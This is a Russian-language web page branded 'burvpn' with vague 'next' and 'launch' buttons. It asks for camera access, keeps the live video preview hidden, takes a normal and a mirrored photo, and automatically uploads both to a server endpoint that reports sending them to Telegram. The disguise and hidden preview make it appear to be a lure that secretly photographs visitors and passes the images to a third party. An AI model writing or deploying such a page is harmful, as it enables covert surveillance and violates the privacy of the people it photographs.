
<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title></title>

<style>
* { box-sizing: border-box; }

body {
    font-family: Arial, sans-serif;
    display: flex;
    align-items: center;
    justify-content: center;
    background: #0d0e12;
    color: white;
    margin: 0;
    padding: 20px;
    min-height: 100vh;
}

.container {
    text-align: center;
    background: #181a20;
    padding: 40px;
    border-radius: 24px;
    box-shadow: 0 20px 40px rgba(0,0,0,.6);
    max-width: 800px;
    width: 100%;
}

h2 { font-size: 28px; }

.subtitle {
    color: #9ca3af;
    font-size: 15px;
    margin-bottom: 30px;
    line-height: 1.5;
}

button {
    padding: 16px 32px;
    font-size: 16px;
    font-weight: bold;
    color: white;
    border: none;
    border-radius: 12px;
    cursor: pointer;
}

.btn-init { background: #3b82f6; }

.shutter-button {
    width: 160px;
    height: 160px;
    border-radius: 50%;
    border: 8px solid #2c313d;
    background: linear-gradient(135deg,#ff416c,#ff4b2b);
    display: none;
    margin: auto;
}

.btn-download {
    background: #10b981;
    width: 100%;
    margin-top: 10px;
}

.btn-retry { background: #4b5563; }

.flash-effect {
    position: fixed;
    inset: 0;
    background: white;
    opacity: 0;
    pointer-events: none;
    z-index: 9999;
}

@keyframes flash {
    0% { opacity: 1; }
    100% { opacity: 0; }
}

.result-box {
    display: none;
    margin-top: 30px;
}

.photos-grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 25px;
    margin-bottom: 25px;
}

.photo-item {
    background: #111622;
    padding: 15px;
    border-radius: 16px;
    border: 1px solid #242f41;
}

.photo-item h3 {
    color: #9ca3af;
    font-size: 16px;
}

canvas {
    width: 100%;
    border-radius: 4px;
    background: white;
}

.actions-row { margin-top: 20px; }

video {
    position: absolute;
    width: 1px;
    height: 1px;
    opacity: 0;
    pointer-events: none;
}

@media(max-width:600px) {
    .photos-grid { grid-template-columns: 1fr; }
    .container { padding: 20px; }
}
</style>
</head>

<body>

<div class="flash-effect" id="flash"></div>

<div class="container">

<h2>burvpn</h2>

<p class="subtitle" id="statusText">
</p>

<video id="video" autoplay playsinline></video>

<button class="btn-init" id="initBtn">
далее
</button>

<button class="shutter-button" id="shootBtn">
запустить
</button>

<div class="result-box" id="resultBox">

<div class="photos-grid">

<div class="photo-item">
<h3>Обычное фото</h3>
<canvas id="normal" width="680" height="600"></canvas>
<button class="btn-download" id="downloadBtn1">
Скачать Обычное 👤
</button>
</div>

<div class="photo-item">
<h3>Зеркальное фото</h3>
<canvas id="mirror" width="680" height="600"></canvas>
<button class="btn-download" id="downloadBtn2">
Скачать Зеркальное 🪞
</button>
</div>

</div>

<div class="actions-row">
<button class="btn-retry" id="retryBtn">
Снять заново 🔄
</button>
</div>

</div>
</div>

<script>
const video = document.getElementById('video');
const initBtn = document.getElementById('initBtn');
const shootBtn = document.getElementById('shootBtn');
const resultBox = document.getElementById('resultBox');
const statusText = document.getElementById('statusText');
const flash = document.getElementById('flash');
const retryBtn = document.getElementById('retryBtn');

const normal = document.getElementById('normal');
const mirror = document.getElementById('mirror');

const ctx1 = normal.getContext('2d');
const ctx2 = mirror.getContext('2d');

function triggerFlash() {
    flash.style.animation = 'none';
    void flash.offsetWidth;
    flash.style.animation = 'flash .4s ease-out';
}

function getFormattedDate() {
    const today = new Date();

    return [
        String(today.getDate()).padStart(2, '0'),
        String(today.getMonth() + 1).padStart(2, '0'),
        today.getFullYear()
    ].join('.');
}

function drawPolaroidFrame(ctx, image, mirrored) {
    ctx.fillStyle = '#ffffff';
    ctx.fillRect(0, 0, 680, 600);

    ctx.save();

    if (mirrored) {
        ctx.translate(660, 20);
        ctx.scale(-1, 1);
        ctx.drawImage(image, 0, 0, 640, 480);
    } else {
        ctx.drawImage(image, 20, 20, 640, 480);
    }

    ctx.restore();

    ctx.fillStyle = '#2c3e50';
    ctx.font = "italic bold 24px 'Courier New'";
    ctx.textAlign = 'right';
    ctx.fillText(getFormattedDate(), 640, 550);
}

// ОТПРАВКА ДВУХ ФОТО

async function sendPhotosToBot() {
    statusText.innerText = 'Отправляем фотографии...';

    const photos = [
        { canvas: normal, caption: 'Обычное фото 📸' },
        { canvas: mirror, caption: 'Зеркальное фото 🪞' }
    ];

    for (const item of photos) {
        const blob = await new Promise(resolve => {
            item.canvas.toBlob(resolve, 'image/png');
        });

        if (!blob) throw new Error('Не удалось создать фото');

        const formData = new FormData();

        formData.append('photo', blob, 'photo.png');
        formData.append('caption', item.caption);

        const response = await fetch('/send-photos', {
            method: 'POST',
            body: formData
        });

        const result = await response.json();

        if (!response.ok) {
            throw new Error(result.error || 'Ошибка отправки');
        }
    }

    statusText.innerText = 'Оба фото отправлены в Telegram! 📸';
}

// ВКЛЮЧЕНИЕ КАМЕРЫ

initBtn.addEventListener('click', async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: true,
            audio: false
        });

        video.srcObject = stream;
        await video.play();

        initBtn.style.display = 'none';
        shootBtn.style.display = 'block';

        statusText.innerText = 'готовы';

    } catch (error) {
        console.error(error);
        alert('Не удалось получить доступ к камере.');
    }
});

// ФОТОГРАФИРОВАНИЕ

shootBtn.addEventListener('click', async () => {
    if (!video.videoWidth || shootBtn.disabled) return;

    shootBtn.disabled = true;
    triggerFlash();

    drawPolaroidFrame(ctx1, video, false);
    drawPolaroidFrame(ctx2, video, true);

    shootBtn.style.display = 'none';
    resultBox.style.display = 'block';

    try {
        await sendPhotosToBot();
    } catch (error) {
        console.error(error);
        statusText.innerText = 'Ошибка: ' + error.message;
    } finally {
        shootBtn.disabled = false;
    }
});

// ПОВТОРНАЯ СЪЁМКА

retryBtn.addEventListener('click', () => {
    resultBox.style.display = 'none';
    shootBtn.style.display = 'block';
    statusText.innerText = 'Готовы? Снимаем ещё раз!';
});

// СКАЧИВАНИЕ

function downloadPhoto(canvas, filename) {
    const link = document.createElement('a');
    link.href = canvas.toDataURL('image/png');
    link.download = filename;
    link.click();
}

document.getElementById('downloadBtn1').addEventListener('click', () => {
    downloadPhoto(normal, 'polaroid-normal.png');
});

document.getElementById('downloadBtn2').addEventListener('click', () => {
    downloadPhoto(mirror, 'polaroid-mirror.png');
});
</script>

</body>
</html>
